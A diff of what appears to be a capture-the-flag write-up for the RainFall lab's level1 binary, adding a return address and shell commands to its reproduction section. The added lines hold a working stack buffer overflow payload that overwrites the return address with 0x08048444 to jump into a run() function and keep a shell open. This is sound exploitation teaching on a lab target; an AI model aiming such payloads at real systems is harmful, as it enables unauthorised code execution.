@@ -26,8 +26,15 @@ Non-debugging symbols:
 **Reproduction**
 - **Payload**:
 
+
+0x08048444
+
 ```sh
 perl -e 'print "A"x76 . "\x44\x84\x04\x08"' | ./level1
+```
+```sh
+level1@RainFall:~$ perl -e 'print "A"x76 . "\x44\x84\x04\x08"' > /tmp/exec
+level1@RainFall:~$ cat /tmp/exec - | ./level1 
 ```
 
 - **What happens**: The first 76 bytes fill the buffer, and the next 4 bytes overwrite the return address. When `main()` returns, the CPU jumps to `run()`.
